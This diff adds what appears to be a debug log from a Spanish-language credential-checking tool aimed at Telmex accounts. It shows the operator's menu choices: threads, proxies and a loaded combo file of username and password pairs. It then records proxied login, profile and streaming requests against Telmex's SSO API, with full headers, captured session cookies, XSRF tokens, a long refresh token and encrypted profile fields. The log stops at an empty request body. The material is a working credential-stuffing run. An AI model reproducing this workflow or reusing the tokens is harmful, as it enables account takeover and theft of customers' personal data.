@@ -1,0 +1,235 @@
+
+                                               ╔═══╗╔═══╗╔══╗ ╔══╗ ╔══╗╔════╗
+                                               ║╔═╗║║╔═╗║║╔╗║ ║╔╗║ ╚╣╠╝║╔╗╔╗║
+                                               ║╚═╝║║║ ║║║╚╝╚╗║╚╝╚╗ ║║ ╚╝║║╚╝
+                                               ║╔╗╔╝║╚═╝║║╔═╗║║╔═╗║ ║║   ║║  
+                                               ║║║╚╗║╔═╗║║╚═╝║║╚═╝║╔╣╠╗ ╔╝╚╗ 
+                                               ╚╝╚═╝╚╝ ╚╝╚═══╝╚═══╝╚══╝ ╚══╝ 
+
+ → Encuentrame: https://t.me/RabbitCoder
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+ [1] Telmex
+
+ → Opcion [Default: 1]: 1
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → ¿Cuantos Hilos o Taks?: 1
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → ¿Deseas usar proxy?
+
+ [1] HTTP
+ [2] SOCKS5
+ [3] OFF
+
+ → Opcion [1/2/3, Default: 1]: 1
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → Combo Archivo seleccionado: C:\Users\maver\OneDrive\Documents\combo.txt
+
+ → Total de líneas: 1
+ → Líneas únicas: 1
+ → Líneas duplicadas o vacías: 0
+ → Tiempo transcurrido: 782.7µs
+
+┌──────────────────────────────────────┐
+            COUNTRY DETECT
+└──────────────────────────────────────┘
+ XX (Genérico .com)         1
+┌──────────────────────────────────────┐
+ TOTAL: 0  - GENERIC (XX): 1
+└──────────────────────────────────────┘
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → Proxy Archivo seleccionado: C:\Users\maver\OneDrive\Documents\PROXY.txt
+ → Total de proxys procesadas: 1
+
+┌─────────────────────────────────────────────────────────────┐
+│          CONFIGURACIÓN REGIONAL DE PROXIES (GeoRoute)       │
+└─────────────────────────────────────────────────────────────┘
+ ¿Cómo deseas configurar la adaptación regional de tus proxies?
+
+  [1] Auto-detectar formato de la lista cargada
+  [2] Pegar un proxy de ejemplo (ej: resident...-country-al:...)
+  [3] Usar plantilla estándar (__cr.{country})
+  [4] No modificar proxies (usar tal como están)
+
+ → Selecciona una opción [1]: 4
+
+ [GeoRoute] Modo sin adaptación regional (proxies directos) (1 proxies cargados)
+
+────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+ → How many MaxRetry? [Type 3 for default]:
+[2026-10-30 15:18:52] POST →  https://appsso.telmex.com/api/v2.3/sso/login
+[2026-10-30 15:18:52] PROXY → unlimited.proxiware.com:1337 [200]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiIzMDJlODk1NWY2YmJmN2YyNmRhNzUxMDhjYjRmNzcwYiIsImlkIjoiYjA1Y2Y3ZTRiYmMzODY0MiIsInRpIjoxNzkzMzkxNTI0NjU4LCJ0ayI6IjI1MzA5NjAifX0=",        
+"traceparent":     "00-302e8955f6bbf7f26da75108cb4f770b-b05cf7e4bbc38642-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-b05cf7e4bbc38642----1793391524658",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+
+[BODY]
+{"username":"3j6vhSO5tDNY/5aVjjYMU3l4Pnzj33xTfcnkgTZWUVu0zLmCEKX9UE8C7leZb/voWg3z","password":"GwymOhtaeAQwDClbymKIm6xdHarH+0Tb9nbZB9tGKfW+hX80wAk="}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-cache, no-store
+Connection: keep-alive
+Content-Security-Policy: default-src 'self'; font-src *;img-src * data:; script-src *; style-src *;
+Content-Type: application/json
+Date: Fri, 30 Oct 2026 20:18:56 GMT
+Expires: Fri, 30 Oct 2026 20:18:56 GMT
+Feature-Policy: geolocation 'self'; vibrate 'none'
+Permissions-Policy: geolocation=(); midi=();notifications=();push=();sync-xhr=();accelerometer=(); gyroscope=(); magnetometer=(); payment=(); camera=(); microphone=();usb=(); xr=();speaker=(self);vibrate=();fullscreen=(self);
+Referrer-Policy: same-origin
+Server: ReplaceHeaderValue
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Trkevent: True
+Uzmcr: 109284
+Uzmcrn: 2704779
+Vary: Accept-Encoding,User-Agent
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+
+[Cookies Recivied]
+__uzma=d65b61d3-4775-4bc0-abea-3fe5553c71d2; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:50 GMT; Max-Age=15724800; SameSite=Lax
+__uzmb=1793391530; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:50 GMT; Max-Age=15724800; SameSite=Lax
+__uzme=8411; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:50 GMT; Max-Age=15724800; SameSite=Lax
+__uzmc=471471014390; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:50 GMT; Max-Age=15724800; SameSite=Lax
+__uzmd=1793391530; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:50 GMT; Max-Age=15724800; SameSite=Lax
+XSRF-TOKEN=eyJpdiI6ImUxa1wvNkV4ZnVVUjUyQXA2Z29vY0RnPT0iLCJ2YWx1ZSI6IjBpUE8zM1I1SVFtQnh2RzRVZEwrV1ZKamNBWUdzWk4ySlludWRSVTFic0gwdE9nS3J5RkNLdWdhZTBQbHVZM3p4WXVJd0ZEQmF6MmhaXC9aemgwVnpDdz09IiwibWFjIjoiNTA0OTdmMGQ2OWI5YzQwYWI1ZjYwMjU3OGY2NjU2MzczNGMyNWVhZDUwZTAyNTdjNGVkZjYzZWE1YjZiOGE4OCJ9; expires=Fri, 30-Oct-2026 22:18:57 GMT; Max-Age=7200; path=/; secure; HttpOnly   
+telmex_middleware=eyJpdiI6ImxFS2lRSGF5VURYQWxQVVJ0WW1TaFE9PSIsInZhbHVlIjoicGxLenhJS29QNjdhNlpwRitIUDlIYXAxc0tONEc4K28rY2E3dkQ3eFFrdGFrTXZvSWRQYU44c003eTNvemtXMzVKQXprZEdsdUVVMVJPQmhISDZUb1E9PSIsIm1hYyI6IjRhNGZlOGU5NzVkMWE2NzZjOTlkNjFlNTEyN2IxMjlkYjRmNmIwZWExOWE2YTY3ZDk0ZTI3OGVlNmQ3ZGFlM2EifQ%3D%3D; path=/; secure; HttpOnly
+__xdst=7f7000f09e99f4-0ceb-43e8-b5bd-90358eafd8110117933915311130-ed7bc497610e1d2110; Expires=Fri, 30-Apr-27 20:18:51 GMT; Max-Age=15724800; HttpOnly; path=/;
+
+[Body]
+{"codigo":"00","description":"\u00c9xito","refresh_token":"eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4R0NNIiwidHlwIjoiSldUIiwiY3R5IjoiSldUIiwiemlwIjoiREVGIiwia2lkIjoiMCJ9.bRWe4yKFlEaxfJhuHXmnUf1krt6dBCrq.KM7wujKoQD4YbXTv.DW0TQEP4vamxNYdWQ5nKcXBtFjM6YR8rt3eyeoQ7PBWw2woWV6joXRBaFe4ut3sgsewL4PLkFB0xP7yH8RqAXj5NDGH-kV7ioi9j8NVz3RUejW6dou0Z4nBqFPwQ10QNb_G45QuCcYknlol6ufxHwN9a_QGr_3A34LOpD1mGm2gUl831-T8c7QvdeKmy45UxDZhHp-dJOgXFFH1DTv-zTCUicUAANCLxFc2GiST-OAnoYj3brLk7QOU2UDeleYNfT7qYnlI7Uewu9x0e707_AnMB-f_eZRJeLgzQRbrd2_pPWlewke3ztIXzhC8Xw9l9xK_ZKaFo56aGRiqHR2K0HSHMMXbv5IN4GsIUnTLUuQldRG_-icHUTnz1xYL0bb4fmZx8cGhLwNIfrZ5v5rBztJDu4B7uFqx3hKXGL5eb8PPVYAyN2vfbpHpbFqzlTaUeL7pGDyZTlaJ2UKiscAR1GZngLfexdVx3uKCN-A72H48DIbL-VZmoaZk6rB775Ld2A_CcPiZaojw-Oq26JHClmTRBHsH7eiKKezmTG8GXqhno7HdsxcazjnvhcpM5GUlibtLvVdxZ2U6_Bp6qUvQZtzdxt0uDUkGxpbpoM6B7XmL4yfxozXosW5TDdhaqHm08fH7VGsK4FWyPZ-lZWeefDgD2OH3GzLYA87vKxAEWrBkbzuwANA4nk8AM3VDz_cBLRT3iexvI6Fe9ikt3YxyjOp5uLHppgO2mw4vwLnCXk051RR74fQNn251-jYvGRriq5cAF4oZA58f0LytQMi5371k3nZz13mdYLaOEOKdHrU_koa2JHKMHp_W3czSjUmuJlMGD2zxr-PeMUDU4winc_EXy98jiLBoZ2idQWbTAc95T8qODeFhuwkSefnUkzYDQaTNWf8MQjv_K_yGxgnWzU2ZsRSC72jPXqlqdKVBABlLNwjp2oQETQSJ1g5xD0TbeeSwI9v2j9qvadoWkCYu_UsHoSL9bOPoHDfvMJ7mq-W5VYGZytDNAErJdEcDmMj5DFIoyA8QujlYNwzLIFEGQUKRIaF8flY_UCiuB7LptjZMTAX-NK611wg0-11jT4uyxAuf4w1i1G14nlXIiabbJRNKzJMh_gVOuJe4_awlgX7B4Uj88X4QMsS04cr19T_9kjjNEcxcUak6TtJrVx50KDLFHq5UsaryTgrpacs2tW9twd6AahZi6vjFzOghhpOHMkb5pP-6q8RkGwCI-AKY-q14xvjlQ02a6HeuDKuN-3uLzTOZPyNqXiT9t4-HrDUlrM1wT8brJg6lJx3AvMRzDi4VhHyWcQy9zy3fuUAVeTs4sprMYQNGhFVLn_5uEURS0ZBe5GZLMBDoRzgJENdUEFORArIHXZ4ppc_BEW0zWgjVRUW03scqYs6JWteCNn88FA6zsATrXEW7XM20pAoMkiMb7gh6euZfNVugKK5k6-DRBXZa7aKQb7zjmEMyw_K8aVLG4oGGr_raUrjLSPvH9naaOB92fJozjse10wAh2vFmxZSdvZGoXOORASPceP7NKvEFhu5vZVN_S6y3yMCK03ky18OvmJQfFocGckaKK6WGT1w57mYiUXD1ZpKk30Q.Ar1exal42raI3ZDXgTCS_g"}        
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:18:58] POST →  https://appsso.telmex.com/api/v2.3/sso/profile
+[2026-10-30 15:18:58] PROXY → unlimited.proxiware.com:1337 [200]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiIzMDJlODk1NWY2YmJmN2YyNmRhNzUxMDhjYjRmNzcwYiIsImlkIjoiYjA1Y2Y3ZTRiYmMzODY0MiIsInRpIjoxNzkzMzkxNTI0NjU4LCJ0ayI6IjI1MzA5NjAifX0=",        
+"traceparent":     "00-302e8955f6bbf7f26da75108cb4f770b-b05cf7e4bbc38642-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-b05cf7e4bbc38642----1793391524658",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+__uzma=d65b61d3-4775-4bc0-abea-3fe5553c71d2; __uzmb=1793391530; __uzme=8411; __uzmc=471471014390; __uzmd=1793391530; XSRF-TOKEN=eyJpdiI6ImUxa1wvNkV4ZnVVUjUyQXA2Z29vY0RnPT0iLCJ2YWx1ZSI6IjBpUE8zM1I1SVFtQnh2RzRVZEwrV1ZKamNBWUdzWk4ySlludWRSVTFic0gwdE9nS3J5RkNLdWdhZTBQbHVZM3p4WXVJd0ZEQmF6MmhaXC9aemgwVnpDdz09IiwibWFjIjoiNTA0OTdmMGQ2OWI5YzQwYWI1ZjYwMjU3OGY2NjU2MzczNGMyNWVhZDUwZTAyNTdjNGVkZjYzZWE1YjZiOGE4OCJ9; telmex_middleware=eyJpdiI6ImxFS2lRSGF5VURYQWxQVVJ0WW1TaFE9PSIsInZhbHVlIjoicGxLenhJS29QNjdhNlpwRitIUDlIYXAxc0tONEc4K28rY2E3dkQ3eFFrdGFrTXZvSWRQYU44c003eTNvemtXMzVKQXprZEdsdUVVMVJPQmhISDZUb1E9PSIsIm1hYyI6IjRhNGZlOGU5NzVkMWE2NzZjOTlkNjFlNTEyN2IxMjlkYjRmNmIwZWExOWE2YTY3ZDk0ZTI3OGVlNmQ3ZGFlM2EifQ%3D%3D; __xdst=7f7000f09e99f4-0ceb-43e8-b5bd-90358eafd8110117933915311130-ed7bc497610e1d2110; __xdst=7f7000f09e99f4-0ceb-43e8-b5bd-90358eafd8110117933915311130-ed7bc497610e1d2110; __uzma=d65b61d3-4775-4bc0-abea-3fe5553c71d2; __uzmb=1793391530; __uzme=8411; __uzmc=471471014390; __uzmd=1793391530; XSRF-TOKEN=eyJpdiI6ImUxa1wvNkV4ZnVVUjUyQXA2Z29vY0RnPT0iLCJ2YWx1ZSI6IjBpUE8zM1I1SVFtQnh2RzRVZEwrV1ZKamNBWUdzWk4ySlludWRSVTFic0gwdE9nS3J5RkNLdWdhZTBQbHVZM3p4WXVJd0ZEQmF6MmhaXC9aemgwVnpDdz09IiwibWFjIjoiNTA0OTdmMGQ2OWI5YzQwYWI1ZjYwMjU3OGY2NjU2MzczNGMyNWVhZDUwZTAyNTdjNGVkZjYzZWE1YjZiOGE4OCJ9; telmex_middleware=eyJpdiI6ImxFS2lRSGF5VURYQWxQVVJ0WW1TaFE9PSIsInZhbHVlIjoicGxLenhJS29QNjdhNlpwRitIUDlIYXAxc0tONEc4K28rY2E3dkQ3eFFrdGFrTXZvSWRQYU44c003eTNvemtXMzVKQXprZEdsdUVVMVJPQmhISDZUb1E9PSIsIm1hYyI6IjRhNGZlOGU5NzVkMWE2NzZjOTlkNjFlNTEyN2IxMjlkYjRmNmIwZWExOWE2YTY3ZDk0ZTI3OGVlNmQ3ZGFlM2EifQ%3D%3D
+
+[BODY]
+{"phone":"","email":"3j6vhSO5tDNY/5aVjjYMU3l4Pnzj33xTfcnkgTZWUVu0zLmCEKX9UE8C7leZb/voWg3z","refresh_token":"eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4R0NNIiwidHlwIjoiSldUIiwiY3R5IjoiSldUIiwiemlwIjoiREVGIiwia2lkIjoiMCJ9.bRWe4yKFlEaxfJhuHXmnUf1krt6dBCrq.KM7wujKoQD4YbXTv.DW0TQEP4vamxNYdWQ5nKcXBtFjM6YR8rt3eyeoQ7PBWw2woWV6joXRBaFe4ut3sgsewL4PLkFB0xP7yH8RqAXj5NDGH-kV7ioi9j8NVz3RUejW6dou0Z4nBqFPwQ10QNb_G45QuCcYknlol6ufxHwN9a_QGr_3A34LOpD1mGm2gUl831-T8c7QvdeKmy45UxDZhHp-dJOgXFFH1DTv-zTCUicUAANCLxFc2GiST-OAnoYj3brLk7QOU2UDeleYNfT7qYnlI7Uewu9x0e707_AnMB-f_eZRJeLgzQRbrd2_pPWlewke3ztIXzhC8Xw9l9xK_ZKaFo56aGRiqHR2K0HSHMMXbv5IN4GsIUnTLUuQldRG_-icHUTnz1xYL0bb4fmZx8cGhLwNIfrZ5v5rBztJDu4B7uFqx3hKXGL5eb8PPVYAyN2vfbpHpbFqzlTaUeL7pGDyZTlaJ2UKiscAR1GZngLfexdVx3uKCN-A72H48DIbL-VZmoaZk6rB775Ld2A_CcPiZaojw-Oq26JHClmTRBHsH7eiKKezmTG8GXqhno7HdsxcazjnvhcpM5GUlibtLvVdxZ2U6_Bp6qUvQZtzdxt0uDUkGxpbpoM6B7XmL4yfxozXosW5TDdhaqHm08fH7VGsK4FWyPZ-lZWeefDgD2OH3GzLYA87vKxAEWrBkbzuwANA4nk8AM3VDz_cBLRT3iexvI6Fe9ikt3YxyjOp5uLHppgO2mw4vwLnCXk051RR74fQNn251-jYvGRriq5cAF4oZA58f0LytQMi5371k3nZz13mdYLaOEOKdHrU_koa2JHKMHp_W3czSjUmuJlMGD2zxr-PeMUDU4winc_EXy98jiLBoZ2idQWbTAc95T8qODeFhuwkSefnUkzYDQaTNWf8MQjv_K_yGxgnWzU2ZsRSC72jPXqlqdKVBABlLNwjp2oQETQSJ1g5xD0TbeeSwI9v2j9qvadoWkCYu_UsHoSL9bOPoHDfvMJ7mq-W5VYGZytDNAErJdEcDmMj5DFIoyA8QujlYNwzLIFEGQUKRIaF8flY_UCiuB7LptjZMTAX-NK611wg0-11jT4uyxAuf4w1i1G14nlXIiabbJRNKzJMh_gVOuJe4_awlgX7B4Uj88X4QMsS04cr19T_9kjjNEcxcUak6TtJrVx50KDLFHq5UsaryTgrpacs2tW9twd6AahZi6vjFzOghhpOHMkb5pP-6q8RkGwCI-AKY-q14xvjlQ02a6HeuDKuN-3uLzTOZPyNqXiT9t4-HrDUlrM1wT8brJg6lJx3AvMRzDi4VhHyWcQy9zy3fuUAVeTs4sprMYQNGhFVLn_5uEURS0ZBe5GZLMBDoRzgJENdUEFORArIHXZ4ppc_BEW0zWgjVRUW03scqYs6JWteCNn88FA6zsATrXEW7XM20pAoMkiMb7gh6euZfNVugKK5k6-DRBXZa7aKQb7zjmEMyw_K8aVLG4oGGr_raUrjLSPvH9naaOB92fJozjse10wAh2vFmxZSdvZGoXOORASPceP7NKvEFhu5vZVN_S6y3yMCK03ky18OvmJQfFocGckaKK6WGT1w57mYiUXD1ZpKk30Q.Ar1exal42raI3ZDXgTCS_g"}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-cache, no-store
+Connection: keep-alive
+Content-Security-Policy: default-src 'self'; font-src *;img-src * data:; script-src *; style-src *;
+Content-Type: application/json
+Date: Fri, 30 Oct 2026 20:19:15 GMT
+Expires: Fri, 30 Oct 2026 20:19:15 GMT
+Feature-Policy: geolocation 'self'; vibrate 'none'
+Permissions-Policy: geolocation=(); midi=();notifications=();push=();sync-xhr=();accelerometer=(); gyroscope=(); magnetometer=(); payment=(); camera=(); microphone=();usb=(); xr=();speaker=(self);vibrate=();fullscreen=(self);
+Referrer-Policy: same-origin
+Server: ReplaceHeaderValue
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Trkevent: True
+Uzmcr: 75448
+Uzmcrn: 1867338
+Vary: Accept-Encoding,User-Agent
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+
+[Cookies Recivied]
+__uzmc=336281374140; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:53 GMT; Max-Age=15724800; SameSite=Lax
+__uzmd=1793391533; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:53 GMT; Max-Age=15724800; SameSite=Lax
+XSRF-TOKEN=eyJpdiI6IjFzUHgwdmxHbXh1MDRTTjJtMG0yXC93PT0iLCJ2YWx1ZSI6IkIrdFJjTDAwU25hWVVhTUY5enVjZlZZXC9pTFUzcDZwSEdQNnBtMm9NV0pOTFlcL0NhaVNaelRGQnkxbWl5XC8zUTNBTEEwUXFQZ0IwbndcLzFERmJCeitIdz09IiwibWFjIjoiZWY3ZGVkOWQzOTVmYmIyOGM1MTlkMWFjZmVmNWYzYTMyNTI2MDMzNWE0NGY2OGVlY2U1YjdmYjk1NjM5NjNiMCJ9; expires=Fri, 30-Oct-2026 22:19:15 GMT; Max-Age=7200; path=/; secure; HttpOnly
+telmex_middleware=eyJpdiI6IjllZDUzWlMyUmhNeWc3UWNvZHJkNnc9PSIsInZhbHVlIjoiaFVlRTZmS2JaTThmdnYyYzRyTU1SRE82VVFEZTZvNUhFQmhZNzR1dnhvTE5uR3NEaHZzMEZ2b2xhdTZua09XUmVvYjlwdm1sRUFxQmhxK0txYlc2QWc9PSIsIm1hYyI6IjQzM2IxNjhjMzVlNGViZjljYWRhMDcwOGMzMGFhZDA0NTA0N2FjOGRjYWUwOTczMWQ1ZTg2MDA5MDJkNTZkMmIifQ%3D%3D; path=/; secure; HttpOnly
+__xdst=7f7000f09e99f4-0ceb-43e8-b5bd-90358eafd8110117933915311133223-684c25238a7c4b7e11; Expires=Fri, 30-Apr-27 20:18:54 GMT; Max-Age=15724800; HttpOnly; path=/;
+
+[Body]
+{"codigo":"00","description":"\u00c9xito","name":"B7LRg8GeseEF8IVt28TT4Wf\/mwYsU0QliXX6GRCrlmp0rNuR2LI=","last_name":"RICpP1yy\/teJo1XBJSIjMynH8Kl+yONtwXWUh+Sv3\/exaQ==","email":"MCWwQldEImaM7PJmSMWV03CUZTkfYmq8jP2tpoqUuAvVT05QDJUUdmbI4Un+lzMryqkI","mobile_phone":"ydf5gAg\/RkxJ3R5xBJDUwh3pPplp6NPrgiDP1aLTuA\/T7t+\/pEw=","is_business":"oOyLrLXgu1XgIF1\/zvMNE4dcxbB+E7lAQpV8kKI=","is_secondary":"Wnjpp4rK26cGRdPZmQonAhhWQ8Nv\/Mfm5KdB57M=","secondary_message":"i7XXXDqdsH7Tnu6BmfoLzDi39R3t6SsEyRL8sZpir1lZiA\/qLY7VBJgaILGxZaepIVcXVo+eWLANw64PAPOJqH7qm0vcRsnRc38pOvs5CeYSmspydUTtzaXZ\/dmheoi2y2ZfXipNhXKhvPlmKKTUMtzp8t8u7Q==","primary_roles":["yL4E8lUiDdoKrpMOYMwZ5dDI2TjUcrPo5+TjSHXt2nlEfw==","3TwlSAgz8SCx8dVzhSJmY4wbBysLnHBvRAvMRSD+PtbMSA==","5Rf1+mN8TOKBmU\/IyI3btM\/NcFf\/qgYuukgN\/KRcFvLffA==","sI2ODczPFmrRgpmH2ikLb8hjkWg4S8vKtJ21jgcH0bRRDA==","Yhjh7YVcB3pBGjKo+Sz\/964CfGTpoEVx+YXsijJDzutiVA==","FXUdNs1AWPzkUS9Hj94zS9fFHr17YMHam2uqI0b\/Ieeuww==","l37w5G8KzPP50b4llTm7Hocx1\/z79dB0AT9Q4x3Sl+o=","g0ZmNQsDw+cdzBEuxqdVFyjTeYP4Sto0p41lrs5qGjGznQ==","vNc4Dtwj+PMJpS1GKSQWZVGSB7p5xzue20M76tv6ZYIimSw=","2ecSo3gd+QY3tHQyVDU8W8h2uoxSaJVpWbIcW3Go3bvusw==","dlfnv00+\/IhH3dyNHWLP3lZZbDVKDEvQfxm9tOGRI6U=","S+LY8dxazM++LG0hr4\/RzzcbMzCy4HVn67TyARueHXYy6g==","cO96lCEgI756E5kTeaqjb+ODUHpUwWnUcGDV2e3jORU=","YEAfeT+b+sxiVUfE4l6sb2HM7cQCTK5EQNIwP8go8mKuZg==","uCsZqC88ENWBmRWH5d7qBCbCsSYfLcFbwrIMVPj89cw=","okm7gtIvoPMMcug9l\/lPr8PdLq1tTZJSR2zhU9kTn\/+S","E+t788\/jG1nwIXtJkTSV32qt2PTIlizC6kE6pmvU\/VUROA==","RPGqCZInojYVCr6HGbokxTdfjbJmrd3De5E82wZgzPHJww==","V29gtTvqSvhx2+zdP\/L0oU2784QTbVhfGcWQE5R836pPEQ==","51EarOEMb8LO\/OZPZfRArHDREcmx1YJ2Y2hNn8K8dWQqjQ==","phMoKw7JcoGmX6qUdCg8vJJphQ8LbtyPaU2XVW1IxBg056M=","B1KCa1yCxX7YWDvl5G+oYDySwaXDXXWx\/awvRsJ30jYBhCfz","k0MRxrVYSvjNj7euWxaTOEpaX4fX8r6iHeEO0hgwJ9K0RB7S","d828Y0W4+vDFhdnPuyzfcu\/zJRyTD604VZxmsMwasFJrYA==","5pu3Gv1KoS7XATNhgBMnReibJDF9YBcTMOGEs33acd5W1Ss=","\/49pDH2ww\/NeAoSoPvXazS0k8SOOqrMGmX6qVZu4nNTlP34=","ACiSgRHUF69K\/NYjC5drkkDG3d8J\/Cuy+H2y0NrqBtLasQ==","5KCkFN80EX4\/sfTF0cX93ibEBhhuWThzhRfNRlSDH8OAxDQ=","wcjnkgU10swCvx8PZwhlV6Yt\/iXxigX3CTpH5c9S1VOpQQ==","abRLO+sCe9wtCqVp3mq8nKip8yyiBzhPeamVEW0UoF1rpw==","NbcnL1HqxHY9THojQmoCyOYq3C0FEfW3Xm9uYL7GUiivDQ==","aiTcaRCJvmmWvszHxA53PDUlFmQ2U3wQ5AbQg0\/GG1V7LQ==","y4Avgs4r9Ue8iT5MS7hrlbQo4RBx21R6Yejdkmw\/TDT6Ko2b","ZIgfoHdTw+fs5iAOOrYQ\/5s2gNwDZbIsgVliiAWC2Qj58Q=="],"secondary_roles":[],"phones":[{"phone":"H1Jr5WTUSqWPTaOvs24p86matcZzS\/qG9yUF8A\/wWupNEUHKCwQ=","activation":"h3Mk+L\/3j1Qv7222Rg7W7B8U6J4Yt86lSOApVuM="}],"business":[]}
+
+────────────────────────────────────────────────────────────────
+
+[2026-10-30 15:19:05] POST →  https://appsso.telmex.com/api/v2.3/streaming/getStreaming
+[2026-10-30 15:19:05] PROXY → unlimited.proxiware.com:1337 [200]
+
+[Send Headers]
+"Accept-Encoding": "gzip",
+"Connection":      "Keep-Alive",
+"Content-Type":    "application/json; charset=utf-8",
+"Host":            "appsso.telmex.com",
+"newrelic":        "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjUzMDk2MCIsImFwIjoiNjQ3ODkwNjY4IiwidHIiOiIzMDJlODk1NWY2YmJmN2YyNmRhNzUxMDhjYjRmNzcwYiIsImlkIjoiYjA1Y2Y3ZTRiYmMzODY0MiIsInRpIjoxNzkzMzkxNTI0NjU4LCJ0ayI6IjI1MzA5NjAifX0=",        
+"traceparent":     "00-302e8955f6bbf7f26da75108cb4f770b-b05cf7e4bbc38642-00",
+"tracestate":      "2530960@nr=0-2-2530960-647890668-b05cf7e4bbc38642----1793391524658",
+"User-Agent":      "okhttp/4.12.0",
+"X-NewRelic-ID":   "VgMEUV9VCBAGUFZaDgEBUFw=",
+"X-Platform":      "Android",
+"X-Version-App":   "4207",
+[Send Cookies]
+__uzma=d65b61d3-4775-4bc0-abea-3fe5553c71d2; __uzmb=1793391530; __uzme=8411; XSRF-TOKEN=eyJpdiI6IjFzUHgwdmxHbXh1MDRTTjJtMG0yXC93PT0iLCJ2YWx1ZSI6IkIrdFJjTDAwU25hWVVhTUY5enVjZlZZXC9pTFUzcDZwSEdQNnBtMm9NV0pOTFlcL0NhaVNaelRGQnkxbWl5XC8zUTNBTEEwUXFQZ0IwbndcLzFERmJCeitIdz09IiwibWFjIjoiZWY3ZGVkOWQzOTVmYmIyOGM1MTlkMWFjZmVmNWYzYTMyNTI2MDMzNWE0NGY2OGVlY2U1YjdmYjk1NjM5NjNiMCJ9; telmex_middleware=eyJpdiI6IjllZDUzWlMyUmhNeWc3UWNvZHJkNnc9PSIsInZhbHVlIjoiaFVlRTZmS2JaTThmdnYyYzRyTU1SRE82VVFEZTZvNUhFQmhZNzR1dnhvTE5uR3NEaHZzMEZ2b2xhdTZua09XUmVvYjlwdm1sRUFxQmhxK0txYlc2QWc9PSIsIm1hYyI6IjQzM2IxNjhjMzVlNGViZjljYWRhMDcwOGMzMGFhZDA0NTA0N2FjOGRjYWUwOTczMWQ1ZTg2MDA5MDJkNTZkMmIifQ%3D%3D; __xdst=7f7000f09e99f4-0ceb-43e8-b5bd-90358eafd8110117933915311133223-684c25238a7c4b7e11; __uzmc=336281374140; __uzmd=1793391533; __uzma=d65b61d3-4775-4bc0-abea-3fe5553c71d2; __uzmb=1793391530; __uzme=8411; XSRF-TOKEN=eyJpdiI6IjFzUHgwdmxHbXh1MDRTTjJtMG0yXC93PT0iLCJ2YWx1ZSI6IkIrdFJjTDAwU25hWVVhTUY5enVjZlZZXC9pTFUzcDZwSEdQNnBtMm9NV0pOTFlcL0NhaVNaelRGQnkxbWl5XC8zUTNBTEEwUXFQZ0IwbndcLzFERmJCeitIdz09IiwibWFjIjoiZWY3ZGVkOWQzOTVmYmIyOGM1MTlkMWFjZmVmNWYzYTMyNTI2MDMzNWE0NGY2OGVlY2U1YjdmYjk1NjM5NjNiMCJ9; telmex_middleware=eyJpdiI6IjllZDUzWlMyUmhNeWc3UWNvZHJkNnc9PSIsInZhbHVlIjoiaFVlRTZmS2JaTThmdnYyYzRyTU1SRE82VVFEZTZvNUhFQmhZNzR1dnhvTE5uR3NEaHZzMEZ2b2xhdTZua09XUmVvYjlwdm1sRUFxQmhxK0txYlc2QWc9PSIsIm1hYyI6IjQzM2IxNjhjMzVlNGViZjljYWRhMDcwOGMzMGFhZDA0NTA0N2FjOGRjYWUwOTczMWQ1ZTg2MDA5MDJkNTZkMmIifQ%3D%3D; __xdst=7f7000f09e99f4-0ceb-43e8-b5bd-90358eafd8110117933915311133223-684c25238a7c4b7e11; __uzmc=336281374140; __uzmd=1793391533   
+
+[BODY]
